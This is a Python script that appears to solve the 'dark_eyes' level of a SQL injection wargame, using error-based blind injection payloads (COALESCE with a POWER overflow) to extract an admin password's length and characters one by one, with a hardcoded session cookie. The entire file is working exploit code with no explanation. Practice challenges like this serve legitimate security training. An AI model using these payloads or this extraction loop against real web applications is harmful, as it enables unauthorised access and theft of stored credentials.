import requests
import string


def find_password_length(n):
    payload = f"?pw=' or id='admin' and COALESCE(LENGTH(pw)={n} or null, POWER(1000000,1000000)) -- "
    if len(send_request(payload)) > 0:
        return n


def find_password(position, char):
    payload = f"?pw=' or id='admin' and COALESCE(SUBSTRING(pw,{position},1)='{char}' or null, POWER(1000000,1000000)) -- "
    if len(send_request(payload)) > 0:
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    characters = string.printable
    pw = []

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'pw length is {length}')
            break

    for i in range(1, length + 1):
        for char in characters:
            if find_password(str(i), char):
                pw.append(char)
                print(f'pw = {pw}')
                break

    print(f'pw={"".join(pw)}')

    if 'DARK_EYES Clear!' in send_request(f'?pw={"".join(pw)}'):
        print('DARK_EYES Clear!')
    else:
        print('Something went wrong!!!')
